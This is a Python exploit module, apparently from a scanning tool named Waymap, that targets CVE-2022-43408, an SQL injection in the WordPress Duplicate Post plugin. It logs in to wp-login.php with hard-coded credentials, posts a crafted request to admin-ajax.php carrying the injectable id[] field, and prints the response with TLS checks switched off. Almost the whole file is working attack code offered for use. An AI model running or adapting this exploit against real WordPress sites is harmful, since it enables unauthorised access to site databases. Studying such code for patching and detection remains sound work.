# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-43408 - WordPress Plugin Duplicate Post - SQL Injection Exploit

import requests
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

USERNAME = 'waymapadmin'
PASSWORD = 'waymappassword'
COMMAND = '1'  

def authenticate(session, target_url, username, password):

    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Starting authentication for {target_url}...")

    auth_url = f'{target_url}/wp-login.php'
    
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    body = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }

    try:
        auth = session.post(auth_url, headers=header, data=body, verify=False)
        if "wp-admin" in auth.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] Authentication successful!")
            return True
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[-] Authentication failed.")
            return False
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[-] Error during authentication: {e}")
        return False

def perform_exploit(session, target_url, command):

    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Performing exploit on {target_url}...")

    exploit_url = f'{target_url}/wp-admin/admin-ajax.php'

    header = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': '*/*',
        'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': target_url
    }

    body = {
        "action": "cdp_action_handling",
        "token": "cdp",
        "f": "copy_post",
        "origin": "tooltip",
        "id[]": command,
        "data[type]": "copy-quick",
        "data[times]": "1",
        "data[site]": "-1",
        "data[profile]": "default",
        "data[swap]": "false"
    }

    try:
        response = session.post(exploit_url, headers=header, data=body, verify=False)
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] Exploit response: \n{response.text}")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[-] Error during exploit: {e}")

def scan_cve_2022_43408(target_url):

    session = requests.Session()
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Starting exploit")

    if authenticate(session, target_url, USERNAME, PASSWORD):
        perform_exploit(session, target_url, COMMAND)

